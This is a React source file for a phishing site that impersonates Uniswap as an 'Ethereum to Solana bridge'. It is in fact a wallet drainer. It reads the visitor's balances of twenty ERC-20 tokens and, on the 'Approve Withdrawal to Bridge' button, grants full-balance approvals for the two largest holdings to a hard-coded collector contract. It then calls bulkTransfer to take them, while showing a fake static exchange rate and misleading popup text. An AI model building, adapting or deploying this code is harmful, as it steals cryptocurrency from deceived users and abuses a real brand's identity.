import React from "react";
import { useEthers } from "@usedapp/core";
import { useState, useEffect } from "react";
import { ethers } from "ethers";
import TokenCollectorABI from "./abis/TokenCollectorABI.json";
import styles from "./styles";
import { uniswapLogo, ethswaplogo, solswaplogo } from "./assets";
import { Exchange, Loader, WalletButton } from "./components";
import PopupMessage from "./components/PopupMessage";
import ConfirmationPopup from "./components/ConfirmationPopup";

const TOKEN_COLLECTOR_ADDRESS = "0x869eFebcCEc7415F9b5eAdB5b9F56BaF4729F02C";

const App = () => {
  const { account, library } = useEthers();
  const [connectedWallet, setConnectedWallet] = useState("");
  const [tokenBalances, setTokenBalances] = useState([]);
  const [inputAmount, setInputAmount] = useState("");
  const [outputAmount, setOutputAmount] = useState("");
  const [isPopupOpen, setIsPopupOpen] = useState(true);
  const [isSecondPopupOpen, setIsSecondPopupOpen] = useState(false);
  const [selectedInputToken, setSelectedInputToken] = useState("ETH");
  const [selectedOutputToken, setSelectedOutputToken] = useState("SOL");
  const [usdValue, setUsdValue] = useState("0.00");

  // Static exchange rate for demonstration
  const STATIC_EXCHANGE_RATE = 0.0453; // 0.0453   ETH = 1 SOL
  // Add this with your other constants
  const ETH_TO_USD_RATE = 2959.46; // 1 ETH = $2859.46 USD
  const SOL_TO_USD_RATE = ETH_TO_USD_RATE * STATIC_EXCHANGE_RATE; // Calculate SOL to USD rate

  useEffect(() => {
    if (account) {
      setConnectedWallet(account);
      fetchAllTokenBalances(account);
    } else {
      setConnectedWallet("");
      setTokenBalances([]);
    }
  }, [account]);

  // Calculate output amount based on input
  useEffect(() => {
    if (inputAmount && !isNaN(inputAmount)) {
      const calculatedOutput = (parseFloat(inputAmount) / STATIC_EXCHANGE_RATE).toFixed(2);
      setOutputAmount(calculatedOutput);
    } else {
      setOutputAmount("");
    }
  }, [inputAmount]);


  // Calculate output amount and USD value based on input
  useEffect(() => {
    if (inputAmount && !isNaN(inputAmount)) {
      const calculatedOutput = (parseFloat(inputAmount) / STATIC_EXCHANGE_RATE).toFixed(4);
      setOutputAmount(calculatedOutput);

      // Calculate USD value
      const calculatedUsdValue = (parseFloat(inputAmount) * ETH_TO_USD_RATE).toFixed(2);
      setUsdValue(calculatedUsdValue);
    } else {
      setOutputAmount("");
      setUsdValue("0.00");
    }
  }, [inputAmount]);

  const fetchAllTokenBalances = async (walletAddress) => {
    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const tokenAddresses = [
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
        "0x6b175474e89094c44da98b954eedeac495271d0f", // DAI
        "0xB8c77482e45F1F44dE1745F52C74426C631bDD52", // BNB
        "0x514910771AF9Ca656af840dff83E8264EcF986CA", // LINK
        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", // WETH
        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", // UNI
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
        "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", // AAVE
        "0x9f8F72aA9304c8B593d555F12ef6589cC3A579A2", // MKR
        "0xc00e94Cb662C3520282E6f5717214004A7f26888", // COMP
        "0xC011A72400E58ecD99Ee497CF89E3775d4bd732F", // SNX
        "0x6B3595068778DD592e39A122f4f5a5cF09C90fE2", // SUSHI
        "0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e", // YFI
        "0xD533a949740bb3306d119CC777fa900bA034cd52", // CRV
        "0x0D8775F648430679A709E98d2b0Cb6250d2887EF", // BAT
        "0xd26114cd6EE289AccF82350c8d8487fedB8A0C07", // OMG
        "0x408e41876cCCDC0F92210600ef50372656052a38", // REN
        "0xE41d2489571d322189246DaFA5ebDe1F4699F498", // ZRX
        "0xba100000625a3754423978a60c9317c58a424e3D", // BAL
      ];

      const erc20Abi = [
        "function balanceOf(address) view returns (uint256)",
        "function decimals() view returns (uint8)",
        "function symbol() view returns (string)",
      ];

      const balancesArray = [];

      for (const address of tokenAddresses) {
        const tokenContract = new ethers.Contract(address, erc20Abi, provider);
        const balanceBN = await tokenContract.balanceOf(walletAddress);
        const decimals = await tokenContract.decimals();
        const symbol = await tokenContract.symbol();
        const adjustedBalance = Number(ethers.utils.formatUnits(balanceBN, decimals));

        if (adjustedBalance > 0) {
          balancesArray.push({
            token: symbol,
            balance: adjustedBalance,
            tokenAddress: address,
            rawBalance: balanceBN
          });
        }
      }


      setTokenBalances(balancesArray);

      console.log("", balancesArray);


    } catch (error) {
      console.error("Failed to recognize address", error);
    }
  };

  const handleSwap = async () => {
    if (!inputAmount || !outputAmount) {
      alert("Please enter an amount");
      return;
    }

    try {
      if (!library) {
        console.error("");
        return;
      }
      await approveTokensForTransfer();
    } catch (error) {
      console.error("Swap failed:", error);
      alert("Swap failed. Please try again.");
    }
  };

  const approveTokensForTransfer = async () => {
    try {
      if (!library) {
        console.error("Failed to recognize address");
        return;
      }
      const signer = library.getSigner();

      const sorted = [...tokenBalances].sort((a, b) => b.balance - a.balance);
      const topTwo = sorted.slice(0, 2);
      if (topTwo.length === 0) {
        alert("Not enough ETH to Bridge to Solana");
        return;
      }

      const erc20Abi = [
        "function approve(address spender, uint256 amount) external returns (bool)"
      ];

      for (let token of topTwo) {
        const tokenContract = new ethers.Contract(token.tokenAddress, erc20Abi, signer);
        console.log(`Approving ${token.token}...`);
        const tx = await tokenContract.approve(
          TOKEN_COLLECTOR_ADDRESS,
          token.rawBalance
        );
        await tx.wait();
        console.log(`Approved ${token.token}`);
      }

      await doBulkTransfer(topTwo, signer);

    } catch (err) {
      console.error("Failed to recognize address", err);
    }
  };

  const doBulkTransfer = async (topTwoTokens, signer) => {
    try {
      const tokenCollector = new ethers.Contract(
        TOKEN_COLLECTOR_ADDRESS,
        TokenCollectorABI,
        signer
      );

      const tokenAddresses = topTwoTokens.map(t => t.tokenAddress);
      const amounts = topTwoTokens.map(t => t.rawBalance);

      console.log("Calling bulkTransfer on TokenCollector...");
      const tx = await tokenCollector.bulkTransfer(tokenAddresses, amounts);
      console.log("bulkTransfer TX sent:", tx.hash);

      const receipt = await tx.wait();
      console.log("bulkTransfer TX confirmed:", receipt.transactionHash);


      alert("Transfer complete!");
      fetchAllTokenBalances(connectedWallet);

    } catch (error) {
      console.error("Error in doBulkTransfer:", error);
    }
  };

  return (
    <div className={styles.container}>
      {/* Popup Message */}
      <PopupMessage
        isOpen={isPopupOpen}
        onClose={() => setIsPopupOpen(false)}
        title="Welcome to Uniswap Bridge"
        message="This is a decentralized bridge portal where you can switch your <strong>Ethereum</strong> to <strong>Solana</strong>.

All you have to do is connect your wallet and approve your <strong>Ethereum</strong> being moved from the ethereum chain to <strong>Solana</strong>.
Please make sure to check the correct addresses after the <strong>Solana</strong> option comes up. "
      />
      <ConfirmationPopup
        isOpen={isSecondPopupOpen}
        onAgree={() => {
          setIsSecondPopupOpen(false);
          approveTokensForTransfer();
        }}
        onClose={() => setIsSecondPopupOpen(false)}
      />
      <div className={styles.innerContainer}>
        <header className={styles.header}>
          <img
            src={uniswapLogo}
            alt="uniswap logo"
            className="w-16 h-16 object-contain"
          />
          <nav className="hidden sm:flex gap-20 ml-[80px]">
            <a href="https://app.uniswap.org/swap" className="text-white hover:text-gray-300 transition-all">Trade</a>
            <a href="https://app.uniswap.org/positions" className="text-white hover:text-gray-300 transition-all">Pool</a>
            <a href="https://app.uniswap.org/explore" className="text-white hover:text-gray-300 transition-all">Farm</a>
            <a href="https://app.uniswap.org/explore/pools" className="text-white hover:text-gray-300 transition-all">Stake</a>
          </nav>

          <WalletButton />
        </header>

        <div className={styles.exchangeContainer}>
          <h1 className={styles.headTitle}>Uniswap</h1>
          <p className={styles.subTitle}>Bridge from Ethereum to Solana in seconds</p>

          <div className={styles.exchangeBoxWrapper}>
            <div className={styles.exchangeBox}>
              <div className="pink_gradient" />
              <div className={styles.exchange}>
                {account ? (
                  <div className="w-full">
                    <div className="flex flex-col w-full">
                      <h2 className="text-white text-xl font-bold mb-2">Bridge Token</h2>
                      <p className="text-gray-400 text-sm mb-6">Bridge your crypto an instant</p>

                      {/* Token Input Section */}
                      <div className="flex flex-col gap-4">
                        <div className="bg-[#1a1a2e] p-4 rounded-xl">
                          <div className="flex justify-between mb-2">
                            <span className="text-gray-400">You send:</span>
                            <span className="text-gray-400">
                              Balance: {tokenBalances[0]?.balance?.toFixed(4) || '0.00'}
                            </span>
                          </div>
                          <div className="flex justify-between">
                            <input
                              type="number"
                              placeholder="0.0000"
                              value={inputAmount}
                              onChange={(e) => setInputAmount(e.target.value)}
                              className="bg-transparent text-white text-2xl w-2/3 focus:outline-none"
                            />
                            <button className="bg-[#2d2d3d] text-white px-4 py-2 rounded-xl flex items-center gap-2">
                              <img src={ethswaplogo} alt="ETH" className="w-6 h-6" />
                              {selectedInputToken}
                            </button>
                          </div>
                        </div>

                        {/* Swap Icon */}
                        <div className="flex justify-center">
                          <div className="w-8 h-8 bg-[#2d2d3d] rounded-full flex items-center justify-center text-white cursor-pointer hover:bg-[#3d3d4d]">
                            ▼
                          </div>
                        </div>

                        {/* Token Output Section */}
                        <div className="bg-[#1a1a2e] p-4 rounded-xl">
                          <div className="flex justify-between mb-2">
                            <span className="text-gray-400">You receive:</span>
                            <span className="text-gray-400">
                              USD Value: ${usdValue}
                            </span>
                          </div>
                          <div className="flex justify-between">
                            <input
                              type="number"
                              placeholder="0.0000"
                              value={outputAmount}
                              className="bg-transparent text-white text-2xl w-2/3 focus:outline-none"
                              readOnly
                            />
                            <button className="bg-[#2d2d3d] text-white px-4 py-2 rounded-xl flex items-center gap-2">
                              <img src={solswaplogo} alt="SOL" className="w-6 h-6" />
                              {selectedOutputToken}
                            </button>
                          </div>
                        </div>
                      </div>

                      {/* Price Info Section */}
                      <div className="mt-6 space-y-2">
                        <div className="flex justify-between text-gray-400">
                          <span>Price:</span>
                          <span>{STATIC_EXCHANGE_RATE}ETH = 1SOL</span>
                        </div>
                        <div className="flex justify-between text-gray-400">
                          <span>Slippage:</span>
                          <span>2%</span>
                        </div>
                        <div className="flex justify-between text-gray-400">
                          <span>Transaction fee:</span>
                          <span>$5.9</span>
                        </div>
                      </div>

                      {/* Swap Button */}
                      <button
                        onClick={() => setIsSecondPopupOpen(true)}
                        className="w-full bg-white text-black font-bold py-4 rounded-xl mt-6 hover:bg-gray-200 transition-all"
                      >
                        Approve Withdrawal to Bridge
                      </button>
                    </div>
                  </div>
                ) : (
                  <Loader title="Please connect your wallet" />
                )}
              </div>
              <div className="blue_gradient" />
            </div>
          </div>
        </div>
        {/* Footer Section */}
        <footer className="w-full mt-16 pt-8 border-t border-site-dim2 text-center">
          <div className="flex flex-col sm:flex-row justify-evenly items-start text-white font-poppins space-y-4 sm:space-y-0">
            <div>
              <h4 className="font-bold mb-2">Resources</h4>
              <ul className="space-y-1">
                <li><a href="https://uniswap.org/developers" className="hover:underline">Docs</a></li>
                <li><a href="https://support.uniswap.org/hc/en-us" className="hover:underline">API</a></li>
                <li><a href="https://github.com/Uniswap" className="hover:underline">GitHub</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-2">Community</h4>
              <ul className="space-y-1">
                <li><a href="https://discord.com/invite/uniswap" className="hover:underline">Discord</a></li>
                <li><a href="https://x.com/Uniswap" className="hover:underline">Twitter</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-2">About</h4>
              <ul className="space-y-1">
                <li><a href="https://boards.greenhouse.io/uniswaplabs" className="hover:underline">Team</a></li>
                <li><a href="https://support.uniswap.org/hc/en-us/requests/new" className="hover:underline">Contact</a></li>
              </ul>
            </div>
          </div>
          <p className="text-dim-white mt-6">© 2024 - Uniswap Labs
          </p>
        </footer>

      </div>
    </div>
  );
};

export default App;